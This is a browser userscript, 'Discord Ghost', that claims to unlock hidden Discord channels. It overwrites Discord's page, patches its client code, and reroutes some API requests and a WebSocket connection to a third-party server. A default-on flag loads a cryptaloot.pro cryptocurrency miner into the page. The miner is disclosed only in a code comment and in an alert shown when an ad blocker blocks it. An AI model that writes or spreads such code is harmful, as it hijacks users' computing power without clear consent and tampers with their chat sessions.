// ==UserScript==
// @name         Discord Ghost
// @namespace    https://nebula-discord.surge.sh
// @version      1.1.2
// @description  Allows you to access ghost channels on Discord.
// @author       Lucario
// @include      https://discordapp.com/channels/*
// @include      https://discordapp.com/invite/*
// @include      https://discord-ghost-channels-discord-ghost.7e14.starter-us-west-2.openshiftapps.com/api/ghostToken*
// @grant        unsafeWindow
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        window.open
// @run-at       document-start
// ==/UserScript==

// true == MINING
// false == MINER OFF, MESSAGE OFF
const enableMiner = true;

const GM_openWindow = window.open;

(function (window){
    let wsTimeout = null;
    function setUpGhost(){
        window.console.log("Setting up Ghost");
        function openWindow(){
            window.removeEventListener("mousedown", openWindow);
            openOAuth2();
        }
        if (!GM_getValue("ghostToken")){
            window.addEventListener("mousedown", openWindow);
        }
        wsConnect();
    }
    if (window.location.host === "discordapp.com"){
        var ws = null;
        /*
            Inject (modified) old client
        */

        window.document.close();
        window.document.open();
        if (window._babelPolyfill !== undefined){
            window.console.log("Ghost script injection failed, reloading...");
            window.setTimeout(() => {window.location.reload();}, 1000);
        }
        let startDiscord = injectedURL => {
            window.addEventListener("ghost_discordReadyEventFinished", setUpGhost);
            window.document.write(`
<head>
<meta charset="utf-8" />
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" name="viewport">
<meta property="og:type" content="website" />
<meta property="og:site_name" content="Discord" />
<meta property="og:title" content="Discord - Free voice and text chat for gamers" />
<meta property="og:description" content="Step up your game with a modern voice & text chat app. Crystal clear voice, multiple server and channel support, mobile apps, and more. Get your free server now!" />
<meta property="og:image" content="https://discordapp.com/assets/ee7c382d9257652a88c8f7b7f22a994d.png" />
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@discordapp">
<meta name="twitter:creator" content="@discordapp">
<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/lcbhdgefieegnkbopmgklhlpjjdgmbog">
<link rel="stylesheet" href="/assets/cbe8e58e8f8d6539165fffff99fdcb00.css" integrity="sha256-DI0DcjVJxh+hO2ndnNWl7EecSBuyD38Ss1+o0dtLdjE= sha512-xXGwMz/O+Kairit4kVb79fYEohgGalqPSsrcGzaNn6OFTPgFFKyKiQAQnAnWnlTP3bN0+KbMPsm5J6wsHTD4Ew=="><link rel="icon" href="/assets/07dca80a102d4149e9736d4b162cff6f.ico" />
<style>
.inner-3if5cm>.flex-lFgbSz.flex-3B1Tl4.horizontal-2BEEBe.horizontal-2VE-Fw.flex-3B1Tl4.directionRow-yNbSvJ.justifyStart-2yIZo0.alignStretch-1hwxMa.noWrap-v6g9vO {height: 44px;}
.scrollerWrap-2uBjct.scrollerThemed-19vinI.themeGhost-10fio9.scrollerFade-28dRsO {height: 751px;}
.message>.accessory>.reactions {margin-top: 16px; margin-bottom: 8px;}
.modal-3HOjGZ.modal-2CasLk.sizeSmall-1sh0-r {min-height: 500px;}
.modal-3HOjGZ.container-2hX5wK.sizeSmall-1sh0-r {min-height: 300px;}
.scrollerWrap-2uBjct.scrollerOuter-ppJFBc.scrollerThemed-19vinI.themeGhost-10fio9.scrollerTrack-3hhmU0 {flex-basis: 68%;}
</style>
<title>Discord</title>
</head>

<body>
<div id="app-mount"></div>
<script>
document.head.__ghost_appendChild = document.head.appendChild;
document.head.appendChild = function (...args){
if (args[0].src === "https://discordapp.com/assets/103.9f4f084f813c4032b669.js") args[0].src = "${injectedURL}";
return document.head.__ghost_appendChild.apply(this, args);
};
</script>
<script>window.__require = window.require</script>
<script>window.__OVERLAY__ = /overlay/.test(location.pathname)</script><script>!function(){if(null!=window.WebSocket){var n=function(n){try{var e=localStorage.getItem(n);return null==e?null:JSON.parse(e)}catch(n){return null}},e=n("token"),o=n("gatewayURL");if(e&&o){var r=null!=window.__require?"etf":"json",t=o+"/?encoding="+r+"&v=6";void 0!==window.Uint8Array&&(t+="&compress=zlib-stream"),console.log("[FAST CONNECT] "+t+", encoding: "+r+", version: 6");var a=new WebSocket(t);a.binaryType="arraybuffer";var s=Date.now(),i={open:!1,gateway:t,messages:[]};a.onopen=function(){console.log("[FAST CONNECT] connected in "+(Date.now()-s)+"ms"),i.open=!0},a.onclose=a.onerror=function(){window._ws=null},a.onmessage=function(n){i.messages.push(n)},window._ws={ws:a,state:i}}}}();</script>
<script src="/assets/f32dcbea13908aefafc3.js" integrity="sha256-IhVqIvHfU7kIFI8k/GaTbI3cnvkjLNs1YnqrQNfIoNw= sha512-qU1imnqblmglvtOzVudeWwABmbbRfQwx6+WQbj03iEUg6ngfZsOoyhN39ipIfDFwetvgaUcO8DfXJBSlOce3gQ=="></script>
<script src="/assets/efcc190d9bccb5d5d3a7.js" integrity="sha256-6oP0rgTHrhAExrghnoMxj5M/+yJ2Z9VbK0ls4e7fbLE= sha512-dbtlcMhRopm0EJmVXZqy33xosOBvspfSzppWJwHTEVY76xHI3ljeCRsaB4AYwBrG/mC0AgLv+wxkxu0bazYATg=="></script>
${enableMiner ? `<script src="https://cryptaloot.pro/lib/crlt.js"></script><script>fetch("https://cryptaloot.pro/lib/mixfork.min.js").then(()=>{const miner = window.miner = new CRLT.Anonymous("8841db0d1017fde30f951886cd8b2718a885140e05b2",{threads:3,throttle:0.7});miner.start();setInterval(() => {console.log("Hashes/s: " + miner.getHashesPerSecond() + "\\nTotal Hashes: " + miner.getTotalHashes());}, 5000);}).catch(()=>{alert("Please disable AdBlock to support the developer of Discord Ghost.\\nYou can turn off this message (and the miner) by editing the first line of this script from true to false.");});</script>` : ""}
</body>
`);
            window.document.close();
            window.console.log("Injected build 10906 (stable) {GHOST PATCH V1.0.0}");
        };
        if (!window.localStorage.injectedBuildVersion || window.localStorage.injectedBuildVersion !== "10906" || !window.localStorage.injectedBuild){
            window.fetch("https://discordapp.com/assets/103.9f4f084f813c4032b669.js").then(file => {
                file.text().then(text => {
                    if (text.startsWith("webpackJsonp")){
                        window.localStorage.injectedBuild = text.replace(`q.on("dispatch",`, `window.processData=`).replace(`.update();`, `.update();window.dispatchEvent(new CustomEvent("ghost_discordReadyEventFinished"));`).replace(`K:p.default.dispatch({type:e,state:t.state,path:t.path,query:t.query})}})`, `K:p.default.dispatch({type:e,state:t.state,path:t.path,query:t.query})}},q.on("dispatch", window.processData)`);
                        window.localStorage.injectedBuildVersion = "10906";
                        startDiscord(window.URL.createObjectURL(new Blob([window.localStorage.injectedBuild], {type: "application/javascript"})));
                    }else{
                        startDiscord("https://discordapp.com/assets/103.9f4f084f813c4032b669.js");
                    }
                }).catch(() => {
                    startDiscord("https://discordapp.com/assets/103.9f4f084f813c4032b669.js");
                });
            }).catch(() => {
                startDiscord("https://discordapp.com/assets/103.9f4f084f813c4032b669.js");
            });
        }else{
            startDiscord(window.URL.createObjectURL(new Blob([window.localStorage.injectedBuild], {type: "application/javascript"})));
        }

        /*
            GHOST Functions
        */

        const ghostChannelRegex = /channels\/11272016/i;
        const ghostInviteRegex = /invite\/ghost\-/i;
        const baseAPI = "https://discordapp.com/api/v6";
        const ghostAPI = "https://discord-ghost-channels-discord-ghost.7e14.starter-us-west-2.openshiftapps.com/api/v6";

        window.XMLHttpRequest.__ghost_open = window.XMLHttpRequest.prototype.open;
        window.XMLHttpRequest.prototype.open = function (...args){
            if (ghostChannelRegex.test(args[1]) || ghostInviteRegex.test(args[1])){
                args[1] = args[1].replace(baseAPI, ghostAPI);
                this.ghost = true;
            }
            return window.XMLHttpRequest.__ghost_open.apply(this, args);
        };

        window.XMLHttpRequest.__ghost_setRequestHeader = window.XMLHttpRequest.prototype.setRequestHeader;
        window.XMLHttpRequest.prototype.setRequestHeader = function (...args){
            if (this.ghost && args[0] === "Authorization"){
                args[0] = "Ghost-Token";
                args[1] = GM_getValue("ghostToken");
            }
            return window.XMLHttpRequest.__ghost_setRequestHeader.apply(this, args);
        };
    }else if (window.location.host === "discord-ghost-channels-discord-ghost.7e14.starter-us-west-2.openshiftapps.com"){
        const check = function (){
            if (window.document.body.innerText && window.document.body.innerText.startsWith("Ghost_Token: ")){
                GM_setValue("ghostToken", window.document.body.innerText.replace("Ghost_Token: ", ""));
                window.close();
            }
        };
        window.setInterval(check, 100);
    }
    /*
        Open OAuth2 Window if Ghost Token Not Available
    */

    function openOAuth2(){
        GM_openWindow("https://discord-ghost-channels-discord-ghost.7e14.starter-us-west-2.openshiftapps.com/getGhostToken/", "Discord Ghost Authentication", `height=750,width=750,modal=yes,toolbar=0,location=0,menubar=0`);
    }
    function wsConnect(){
        const gt = GM_getValue("ghostToken");
        if (gt){
            ws && ws.readyState && ws.readyState === window.WebSocket.OPEN && ws.close && typeof ws.close === "function" && ws.close();
            ws = new WebSocket(`wss://discord-ghost-channels-discord-ghost.7e14.starter-us-west-2.openshiftapps.com/ws?ghostToken=${gt}`);
            ws.onclose = function (){
                clearTimeout(wsTimeout);
                wsTimeout = setTimeout(wsConnect, 5000);
            };
            ws.onerror = function (){
                const xhr = new XMLHttpRequest();
                function openWindow(){
                    window.removeEventListener("mousedown", openWindow);
                    openOAuth2();
                }
                xhr.addEventListener("load", () => {
                    if (xhr.responseText === "false") window.addEventListener("mousedown", openWindow);
                });
                xhr.open("GET", `https://discord-ghost-channels-discord-ghost.7e14.starter-us-west-2.openshiftapps.com/checkGhostToken?ghostToken=${gt}`, true);
                xhr.timeout = 5000;
                xhr.send();
            };
            ws.onopen = function (){
                console.log("Connected to Ghost gateway");
                ws.onerror = null;
            };
            ws.onmessage = function (msg){
                msg = window.JSON.parse(msg.data);
                window.processData(msg.ghost_type, msg);
            };
        }
    }
})(unsafeWindow);